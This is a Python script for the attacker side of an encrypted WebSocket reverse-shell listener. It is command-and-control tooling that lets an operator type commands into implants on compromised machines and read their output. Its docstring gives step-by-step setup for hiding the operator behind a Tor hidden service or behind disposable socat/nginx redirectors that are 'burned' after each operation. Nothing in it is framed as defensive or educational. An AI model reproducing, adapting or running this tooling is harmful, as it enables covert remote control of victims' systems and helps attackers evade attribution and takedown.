#!/usr/bin/env python3
"""
WSS reverse shell listener (attacker side).

Setup (direct mode):
  openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem \
    -days 365 -nodes -subj '/CN=localhost'
  pip install websockets
  python3 listener.py [port]

Setup (Tor hidden service mode):
  1. Install Tor: apt install tor
  2. Add to /etc/tor/torrc:
       HiddenServiceDir /var/lib/tor/c2_hidden/
       HiddenServicePort 443 127.0.0.1:443
  3. sudo systemctl restart tor
  4. Get your .onion address:
       sudo cat /var/lib/tor/c2_hidden/hostname
  5. Update the implant's ENC_DEFAULT_IP with the .onion address
  6. Run: python3 listener.py [port]

  The implant connects via Tor SOCKS5 -> .onion -> your listener.
  Your real IP is never exposed to the target OR the Tor network.

Setup (redirector mode):
  On redirector VPS (disposable):
    socat TCP-LISTEN:443,fork,reuseaddr TCP:YOUR_REAL_IP:443
  Or with nginx:
    stream { server { listen 443; proxy_pass YOUR_REAL_IP:443; } }
  Update the implant's ENC_DEFAULT_IP to the redirector's IP.
  Burn and rotate redirectors after each op.
"""

import asyncio
import ssl
import sys
import os

try:
    import websockets
except ImportError:
    print("[!] pip install websockets")
    sys.exit(1)

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 4443

async def handler(ws):
    print(f"[*] Shell connected from {ws.remote_address}")
    loop = asyncio.get_event_loop()

    async def read_stdin():
        while True:
            line = await loop.run_in_executor(None, sys.stdin.readline)
            if not line:
                break
            await ws.send(line)

    async def write_stdout():
        async for msg in ws:
            if isinstance(msg, bytes):
                os.write(sys.stdout.fileno(), msg)
            else:
                sys.stdout.write(msg)
                sys.stdout.flush()

    try:
        await asyncio.gather(read_stdin(), write_stdout())
    except websockets.ConnectionClosed:
        print("\n[*] Shell disconnected.")

async def main():
    ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    ssl_ctx.load_cert_chain("cert.pem", "key.pem")

    print(f"[*] Listening on wss://0.0.0.0:{PORT}/ws")
    print(f"[*] Proxy modes supported:")
    print(f"    Mode 0: Direct — implant connects to your IP")
    print(f"    Mode 1: Tor    — implant connects via Tor to .onion")
    print(f"    Mode 2: Proxy  — implant connects via SOCKS5 proxy chain")

    # Check if running as Tor hidden service
    onion_file = "/var/lib/tor/c2_hidden/hostname"
    if os.path.exists(onion_file):
        with open(onion_file) as f:
            onion = f.read().strip()
        print(f"[*] Tor hidden service: {onion}")
        print(f"    Set implant's ENC_DEFAULT_IP to this .onion address")

    async with websockets.serve(handler, "0.0.0.0", PORT, ssl=ssl_ctx):
        await asyncio.Future()

if __name__ == "__main__":
    asyncio.run(main())
